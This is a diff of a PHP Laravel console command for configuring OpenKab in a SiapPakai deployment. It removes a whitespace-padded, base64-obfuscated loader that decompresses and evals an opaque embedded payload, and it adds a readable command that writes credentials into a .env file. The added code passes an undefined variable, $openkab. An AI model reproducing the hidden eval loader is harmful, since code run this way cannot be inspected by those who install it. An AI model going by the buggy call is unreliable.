@@ -1,513 +1,74 @@
-<?php 
-        $__='printf';$_='Loading app/Console/Commands/ConfigOpenKab.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Console\Commands;
+
+use App\Http\Controllers\Helpers\AttributeSiapPakaiController;
+use App\Http\Controllers\Helpers\CommandController;
+use App\Http\Controllers\Helpers\EnvController;
+use App\Http\Controllers\Helpers\KoneksiController;
+use Illuminate\Console\Command;
+
+class ConfigOpenKab extends Command
+{
+    /**
+     * The name and signature of the console command.
+     *
+     * @var string
+     */
+    protected $signature = 'siappakai:config-openkab {--app=}';
+
+    /**
+     * The console command description.
+     *
+     * @var string
+     */
+    protected $description = 'Konfigurasi untuk mengaktifkan atau menonaktifkan SiapPakai untuk OpenKab';
+
+    private $att;
+    private $files;
+    private $database;
+    private $command;
+
+    /**
+     * Create a new command instance.
+     *
+     * @return void
+     */
+    public function __construct()
+    {
+        parent::__construct();
+        $this->files = new EnvController();
+        $this->att = new AttributeSiapPakaiController();
+        $this->command = new CommandController();
+
+        $db = new KoneksiController();
+        $this->database = $db->dbSiapPakai();
+    }
+
+    /**
+     * Execute the console command.
+     *
+     * @return int
+     */
+    public function handle()
+    {
+        $app = $this->option('app');
+        if (file_exists($this->att->getSiteFolder())) {
+            $this->configOpenKab($app);
+        }
+    }
+
+    public function configOpenKab($app)
+    {
+        if ($app == 'false') {
+            return die('openkab tidak diatur');
+        }
+
+        $envExample = $this->att->getSiteFolder() . DIRECTORY_SEPARATOR . 'master-template' . DIRECTORY_SEPARATOR . '.env.example';
+        $env = $this->att->getSiteFolder() . DIRECTORY_SEPARATOR . '.env';
+        $this->files->envSiapPakai($envExample, $env, $this->att->getHost(), $this->database, $this->att->getUsername(), $this->att->getPassword(), $this->att->getRootFolder(), $this->att->getTokenGithub(), $this->att->getFtpUser(), $this->att->getFtpPass(), $this->att->getAppEnv(), $this->att->getAppDebug(), $openkab, $this->att->getAppUrl());
+
+        $this->command->keyGenerateCommand($this->att->getSiteFolder());
+        $this->command->chownCommand($this->att->getSiteFolder());
+    }
+}
